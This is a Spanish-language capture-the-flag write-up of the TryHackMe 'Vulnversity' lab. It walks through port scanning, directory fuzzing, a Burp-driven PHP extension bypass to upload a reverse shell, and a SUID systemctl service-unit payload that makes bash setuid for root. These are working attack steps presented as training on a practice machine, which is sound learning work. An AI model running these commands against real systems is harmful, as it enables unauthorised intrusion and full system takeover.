---
title: Vulnversity - TryHackMe
categories: [Fuzzing, Reverse Shell, Burp Suite, File Upload Bypass, SUID]
published: true
---

El día de hoy vamos a resolver la máquina _Vulnversity_ de _TryHackMe_. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/1.png)

### [](#header-3)Fase De Reconocimiento

Primeramente, vamos a utilizar la herramienta _Nmap_ para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Es importante aclarar que, así como menciona la plataforma de _TryHackMe_, existen diversos [cheatsheets](https://www.stationx.net/nmap-cheat-sheet/) que podemos encontrar en internet, cuyo principal objetivo es darnos a conocer cuales son todas las posibilidades que nos ofrece la herramienta.

No obstante, recordemos que varias herramientas por defecto tienen incluidas un `manual` o vienen con un comando `--help`.

```
man nmap
```

```
nmap --help
```

Entre las preguntas que nos realiza la plataforma en esta primera fase, se encuentra:

* ¿Cuántos puertos abiertos existen?
* ¿Qué sistema operativo tiene la máquina ante la que nos estamos enfrentando?
* ¿En qué puerto está corriendo el servidor web?
* ¿Qué versión de squid proxy está corriendo en la máquina?

Todas estas preguntas son fáciles de responder si realizamos un buen escaneo con _Nmap_. 

Para determinar que puertos están abiertos podemos realizar lo siguiente:
  
```bash
nmap -p- --open -T5 -v -n <dirección IP>
```
 
Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:
  
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <dirección IP>
```

A continuación se explican los parámetros utilizados en el escaneo de puertos con _Nmap_:

| Parámetro | Explicación |
|:----------|:------------|
| \-p\- | Escanea todo el rango de puertos (65535 en total) |
| \-\-open | Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos) |
| \-T5 | La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, "generaremos más ruido", pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos `White Hat` | 
| \-v | _Verbose_, reporta lo encontrado por consola |
| \-n | No aplicar _resolución DNS_ |
| \-sS | Escaneo _TCP SYN_ |
| \-min-rate | Emitir paquetes no más lentos que \<valor\> por segundo |
| \-vvv | Triple _verbose_, para obtener mayor información por consola |
| \-Pn | No aplicar _host discovery_ |

```bash 
nmap -sC -sV -p 21,22,139,445,3128,3333 <dirección IP>
```
  
A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con _Nmap_:

| Parámetro | Explicación |
|:----------|:------------|
| \-sC | Scripts básicos de enumeración |
| \-sV | Versión y servicios que corren bajo los puertos encontrados |
| \-p | Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior) |

Con estos dos escaneos bastará para responder a las preguntas planteadas con anterioridad, sin embargo, nos quedan dos preguntas más, las cuales son:

* ¿Cuántos puertos se escanearán si utilizamos el parámetro -p-400?
* Utilizando el parámetro -n, ¿qué no se está resolviendo?

Para responder a estas dos preguntas bastará con haber leído el `manual` de _Nmap_, haber utilizado su parámetro `--help`, o bien, haber prestado atención a los parámetros utilizados durante el escaneo. En este caso, si colocamos un número después de `-p-`, se escaneará tantos puertos hayamos indicado; y en el caso del parámetro `-n`, no se aplicará _resolución DNS_.

Una vez hemos determinado que puertos están abiertos, así como identificado la versión y servicios que corren en el activo, otro paso importante dentro de la fase de reconocimiento, es el `fuzzing`; cabe aclarar que este solo se realiza cuando la máquina víctima está corriendo un servidor web.

_TryHackMe_ nos recomienda utilizar `GoBuster`, sin embargo, personalmente prefiero el uso de `Wfuzz`; en caso de no contar con esta herramienta instalada, bastará con realizar lo siguiente:
  
```
sudo apt install wfuzz
```

Para pasar a la fase de explotación, lo que nos solicita la plataforma es encontrar una ruta potencial de la página web, que nos permita una subida de archivos, para lo cual debemos de _fuzzear_ la página web, para ello realizaremos lo siguiente:

```bash
wfuzz -c -L -t 400 --hc 404 --hh 33014 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://dirección IP:3333/FUZZ
```

A continuación se explican los parámetros utilizados en el _fuzzeo_ del servidor web:

| Parámetro | Explicación |
|:----------|:------------|
| \-c | Output colorizado |
| \-L | Sigue las redirecciones HTTP, de modo que conseguimos el código de estado final verdadero |
| \-t | Específicamos el número de hilos con el queremos trabajar |
| \-\-hc | Oculta las respuestas con el código de estado que indiquemos, en este caso los errores (código de estado 404) |
| \-\-hh | Oculta las respuestas con el número de caractéres que indiquemos; esto no es necesario, sin embargo, es útil para descartar respuestas con contenido que vemos que no nos interesan |
| \-w | Especificamos el diccionario con el que queremos trabajar |

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/2.png)

En caso de no utilizar el parámetro `-hh`, vemos que obtenemos una mayor cantidad de respuestas, sin embargo, no son relevantes, por este motivo es que se las escondió.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/3.png)

Como podemos observar, existen cinco direcciones a las cuales podemos acceder, sin embargo, solamente una de ellas llama nuestra atención, la dirección `internal`, ya que en _images_, _css_, _js_ y _fonts_ parece ser donde está alojado el contenido de la página web. Y en efecto, al entrar en la dirección `internal`, podemos observar que tenemos un panel que nos permite realizar una subida de archivos, con la cual nos entablaremos una `reverse shell`.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/4.png)

### [](#header-3)Fase De Explotación

Al encontrarnos una ruta potencial que nos permite una subida de archivos, lo primero que vamos a intentar es entablarnos una `reverse shell`; podemos descargar una [aquí](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). Una vez la hayamos descargado, tenemos que modificar el valor de la `ip` (colocamos la nuestra), y si queremos, podemos también modificar el valor del _puerto_, aunque esto es completamente opcional.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/5.png)

Sin embargo, cuando intentamos subir nuestra `reverse shell`, nos aparecerá un mensaje indicándonos que la extensión de nuestro archivo no es permitida.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/6.png)

Por lo que tendremos que buscar una extensión que no nos de problema alguno. Si realizáramos este proceso de forma manual, sería algo bastante tedioso, por lo que vamos a utilizar `Burp Suite` para poder realizar un ataque de tipo `Sniper`.

Para ello, vamos a empezar por volver a subir nuestra `reverse shell`, pero ahora tramitando todas las peticiones a través de `Burp Suite`.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/7.png)

Posterior a ello presionaremos `Ctrl + I` para enviar esta petición al `Intruder`.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/8.png)

Ahora, en el apartado _Positions_, en el tipo de ataque elegiremos la opción de `Sniper`, después seleccionaremos la opción `Clear §`, para posteriormente con nuestro cursor `resaltar` la zona en la que se encuentra la extensión del archivo que subimos, para finalmente presionar la opción `Add §`; esto se vería algo así:

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/9.png)

Posteriormente, procederemos a crear un pequeño diccionario con las extensiones más comunes de _PHP_:

* .php
* .phtml
* .php3
* .php4
* .php5
* .php7
* .phps
* .php-s
* .pht
* .phar

Una vez, hemos creado nuestro diccionario, en el apartado _Payloads_, en la opción _Sample List_ cargaremos el diccionario que hemos creado; en este mismo apartado, en el final, encontraremos una opción que codifica ciertos caracteres especiales, esta opción la desactivaremos. 

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/10.png)

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/11.png)

Finalmente, presionaremos el botón de iniciar ataque, e inmediatamente aparecerá una nueva ventana mostrándonos los resultados obtenidos, o bien, aquello que todavía está probando. Podríamos revisar una a una las respuestas del lado del servidor, pero si nos percatamos, aunque todas las respuestas tengan el mismo código de estado `200`, la _longitud_ de estas no es la misma para todas las extensiones, la única extensión cuya _longitud_ varía es `.phtml`; si quisiéramos estar completamente seguros, podríamos revisar el _render_ de la respuesta, el cual nos devuelve un _success_.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/12.png)

Con esta información, ya sabemos que tipo de archivo es válido para subir en la ruta `internal`, por lo que procederemos a cambiar la extensión de nuestro archivo y subirlo una última vez.

Una vez el archivo está subido, podemos ponernos en escucha por el puerto que hayamos establecido en nuestra `reverse shell` a través de `Netcat`. A partir de aquí podemos hacer dos cosas:

Podemos navegar a la dirección en la que está subido nuestro archivo (tal como lo indica la plataforma de _TryHackMe_), es decir, entrar a:

```
http://<dirección IP>:3333/internal/uploads/nombreDeLaReverseShell.phtml
```
O, por otra parte, y sin dejar la consola, utilizar el comando `curl`:

```
curl http://<dirección IP>:3333/internal/uploads/nombreDeLaReverseShell.phtml
```

Ambas opciones, nos conseguirán una _consola_ dentro de la máquina víctima.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/13.png)

Es importante aclarar que la _consola_ que acabamos de conseguir, no es nada interactiva, esto quiere decir que si quisiéramos limpiar la _consola_ utilizando `Ctrl + L`, no pasará nada, así mismo si quisiéramos desplazarnos utilizando las `flechas` del teclado, no nos será posible hacerlo, para ello deberemos de realizar el respectivo tratamiento de la `TTY`, para lo cual haremos lo siguiente:

```bash
script /dev/null -c bash

Ctrl + Z

stty raw -echo; fg
reset
xterm

export TERM=xterm
export SHELL=bash

stty rows <valor> columns <valor>
```

Los valores que colocaremos en `<valor>` en el último comando, dependerán del tamaño de nuestra pantalla, por lo cual en una nueva terminal de nuestra máquina escribiremos lo siguiente:

```
stty -a
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/14.png)

Continuando con las preguntas de la plataforma, se nos pide averiguar por el usuario que maneja el servidor web, así como su respectiva flag. Para realizar esto podríamos dirigirnos al directorio `/home`, y listar los directorios que existen.

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/15.png)

Aunque también podríamos filtrar del archivo `/etc/passwd`, a través de expresiones regulares, todos aquello usuario que tengan una _shell_, sea esta una:

* bash
* csh
* ksh
* sh
* tcsh
* zsh

Esto sería bastante fácil, ya que todas, o casi todas las _shells_ terminan en `sh`, de modo que con ambas formas podemos determinar que usuarios existen a nivel de sistema.

```bash
cat /etc/passwd | grep "sh$"
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/16.png)

Una vez hemos listado los usuarios del sistema, podemos pasar a buscar en que ruta se encuentra la flag del usuario con bajos privilegios, para ello podemos hacer lo siguiente:

```bash
find / -name user.txt 2> /dev/null
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/17.png)

### [](#header-3)Escalada De Privilegios

Para realizar esta última fase, la misma plataforma de _TryHackMe_ nos sugiere aprovecharnos de algún binario con permisos mal asignados, concretamente permisos `SUID`. 

Para listar todos aquellos binarios con permisos `SUID` asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo:

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
```

```bash
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/18.png)

La mejor forma para abusar de cualquier binario, es recurrir a [GTFOBins](https://gtfobins.github.io/), esta página nos enseña como explotar binarios con _capabilities_ mal asignadas, binarios que se pueden ejecutar como root, y en este caso, binarios con permisos `SUID` mal asignados.

El binario más extraño que nos encontramos es `/bin/systemctl`, ya que este comando lo que nos permite es controlar el sistema y sus servicios, por lo que procederemos a buscarlo en [GTFOBins](https://gtfobins.github.io/).

![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/19.png)

Como podemos ver, podemos abusar de este binario fácilmente, además de que nos permite ejecutar cualquier código malicioso que queramos

Para conseguir la última flag haremos lo siguiente:

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

Si nos percatamos, lo único que modificamos de la información que nos provee `GTFOBins`, fue el código a ejecutar, en este caso, estamos asignando un permiso `SUID` a la `/bin/bash`, para posteriormente, a través del parámetro `-p`, ejecutar el binario `/bin/bash` manteniendo permisos y privilegios del usuario al que le pertenece el binario, en este caso al usuario root. Otro aspecto que se modificó, fue utilizar el binario `/bin/systemctl` desde su ruta absoluta, mas no de su ruta relativa.

Una vez hemos abusado del binario `/bin/systemctl`, haremos lo siguiente:

```
/bin/bash -p
```

Una vez siendo root, podemos pasar a buscar su respectiva flag, esto lo podemos hacer así:

```bash
find / -name root.txt
```
 
![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-10-25-Vulnversity-TryHackMe/20.png)
